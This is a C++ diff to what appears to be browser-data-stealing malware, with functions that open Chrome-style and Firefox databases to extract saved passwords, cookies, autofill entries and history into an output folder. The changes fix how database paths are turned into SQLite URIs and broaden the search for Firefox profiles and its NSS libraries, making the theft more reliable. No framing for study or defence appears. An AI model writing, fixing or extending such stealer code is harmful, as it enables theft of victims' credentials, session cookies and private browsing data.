@@ -24,6 +24,7 @@
 namespace fs = std::filesystem;
 
 std::string to_narrow_string(const wchar_t* w_str);
+std::string to_uri_path(const std::wstring& path);
 
 struct BrowserConfig {
     std::string name;
@@ -789,7 +790,7 @@ void extract_passwords(const fs::path& profile_path, const fs::path& output_dir,
     }
     if (!fs::exists(db_path)) return;
 
-    std::string db_uri = "file:" + to_narrow_string(db_path.wstring().c_str()) + "?mode=ro&nolock=1";
+    std::string db_uri = to_uri_path(db_path.wstring());
     sqlite3* db;
     if (sqlite3_open_v2(db_uri.c_str(), &db, SQLITE_OPEN_READONLY | SQLITE_OPEN_URI, NULL) == SQLITE_OK) {
         sqlite3_stmt* stmt;
@@ -820,7 +821,7 @@ void extract_cookies(const fs::path& profile_path, const fs::path& output_dir, c
     if (!fs::exists(db_path)) db_path = profile_path / "Cookies";
     if (!fs::exists(db_path)) return;
 
-    std::string db_uri = "file:" + to_narrow_string(db_path.wstring().c_str()) + "?mode=ro&nolock=1";
+    std::string db_uri = to_uri_path(db_path.wstring());
     sqlite3* db;
     if (sqlite3_open_v2(db_uri.c_str(), &db, SQLITE_OPEN_READONLY | SQLITE_OPEN_URI, NULL) == SQLITE_OK) {
         sqlite3_stmt* stmt;
@@ -858,9 +859,9 @@ void extract_autofill(const fs::path& profile_path, const fs::path& output_dir, 
         fs::path db_path = profile_path / db_name;
         if (!fs::exists(db_path)) continue;
 
-        std::string db_uri = "file:" + to_narrow_string(db_path.wstring().c_str()) + "?mode=ro&nolock=1";
-    sqlite3* db;
-    if (sqlite3_open_v2(db_uri.c_str(), &db, SQLITE_OPEN_READONLY | SQLITE_OPEN_URI, NULL) == SQLITE_OK) {
+        std::string db_uri = to_uri_path(db_path.wstring());
+        sqlite3* db;
+        if (sqlite3_open_v2(db_uri.c_str(), &db, SQLITE_OPEN_READONLY | SQLITE_OPEN_URI, NULL) == SQLITE_OK) {
             sqlite3_stmt* stmt;
 
             if (sqlite3_prepare_v2(db, "SELECT name, value FROM autofill", -1, &stmt, NULL) == SQLITE_OK) {
@@ -907,7 +908,7 @@ void extract_history(const fs::path& profile_path, const fs::path& output_dir, c
     fs::path db_path = profile_path / "History";
     if (!fs::exists(db_path)) return;
 
-    std::string db_uri = "file:" + to_narrow_string(db_path.wstring().c_str()) + "?mode=ro&nolock=1";
+    std::string db_uri = to_uri_path(db_path.wstring());
     sqlite3* db;
     if (sqlite3_open_v2(db_uri.c_str(), &db, SQLITE_OPEN_READONLY | SQLITE_OPEN_URI, NULL) == SQLITE_OK) {
         sqlite3_stmt* stmt;
@@ -972,13 +973,26 @@ std::string to_narrow_string(const wchar_t* w_str) {
     if (!res.empty() && res.back() == '\0') res.pop_back();
     return res;
 }
+
+std::string to_uri_path(const std::wstring& path) {
+    std::string s = to_narrow_string(path.c_str());
+    std::replace(s.begin(), s.end(), '\\', '/');
+
+    std::string encoded;
+    for (char c : s) {
+        if (c == ' ') encoded += "%20";
+        else encoded += c;
+    }
+    return "file:///" + encoded + "?mode=ro&nolock=1";
+}
+
 // Final check
 
 void extract_firefox_cookies(const fs::path& profile_path, const fs::path& output_dir, const std::string& temp_prefix) {
     fs::path db_path = profile_path / "cookies.sqlite";
     if (!fs::exists(db_path)) return;
 
-    std::string db_uri = "file:" + to_narrow_string(db_path.wstring().c_str()) + "?mode=ro&nolock=1";
+    std::string db_uri = to_uri_path(db_path.wstring());
     sqlite3* db;
     if (sqlite3_open_v2(db_uri.c_str(), &db, SQLITE_OPEN_READONLY | SQLITE_OPEN_URI, NULL) == SQLITE_OK) {
         sqlite3_stmt* stmt;
@@ -1003,7 +1017,7 @@ void extract_firefox_history(const fs::path& profile_path, const fs::path& outpu
     fs::path db_path = profile_path / "places.sqlite";
     if (!fs::exists(db_path)) return;
 
-    std::string db_uri = "file:" + to_narrow_string(db_path.wstring().c_str()) + "?mode=ro&nolock=1";
+    std::string db_uri = to_uri_path(db_path.wstring());
     sqlite3* db;
     if (sqlite3_open_v2(db_uri.c_str(), &db, SQLITE_OPEN_READONLY | SQLITE_OPEN_URI, NULL) == SQLITE_OK) {
         sqlite3_stmt* stmt;
@@ -1027,7 +1041,7 @@ void extract_firefox_autofill(const fs::path& profile_path, const fs::path& outp
     fs::path db_path = profile_path / "formhistory.sqlite";
     if (!fs::exists(db_path)) return;
 
-    std::string db_uri = "file:" + to_narrow_string(db_path.wstring().c_str()) + "?mode=ro&nolock=1";
+    std::string db_uri = to_uri_path(db_path.wstring());
     sqlite3* db;
     if (sqlite3_open_v2(db_uri.c_str(), &db, SQLITE_OPEN_READONLY | SQLITE_OPEN_URI, NULL) == SQLITE_OK) {
         sqlite3_stmt* stmt;
@@ -1054,11 +1068,16 @@ void extract_firefox_data(const BrowserConfig& config, const std::wstring& user_
     fs::create_directories(output_root);
 
     fs::path nss_dir;
+    std::vector<std::wstring> search_roots = get_search_roots();
     for (const auto& path : config.exe_paths) {
-        if (fs::exists(path)) {
-            nss_dir = fs::path(path).parent_path();
-            break;
+        for (const auto& root : search_roots) {
+            fs::path full_path = fs::path(root) / path;
+            if (fs::exists(full_path)) {
+                nss_dir = full_path.parent_path();
+                break;
+            }
         }
+        if (!nss_dir.empty()) break;
     }
 
     std::error_code ec_ff;
@@ -1066,7 +1085,7 @@ void extract_firefox_data(const BrowserConfig& config, const std::wstring& user_
         for (const auto& entry : fs::directory_iterator(user_data, ec_ff)) {
             if (entry.is_directory()) {
                 fs::path profile_path = entry.path();
-                if (fs::exists(profile_path / "cookies.sqlite") || fs::exists(profile_path / "logins.json")) {
+                if (fs::exists(profile_path / "cookies.sqlite") || fs::exists(profile_path / "logins.json") || fs::exists(profile_path / "places.sqlite") || fs::exists(profile_path / "formhistory.sqlite")) {
                     std::string profile_name = profile_path.filename().string();
                     fs::path profile_output = output_root / profile_name;
                     fs::create_directories(profile_output);
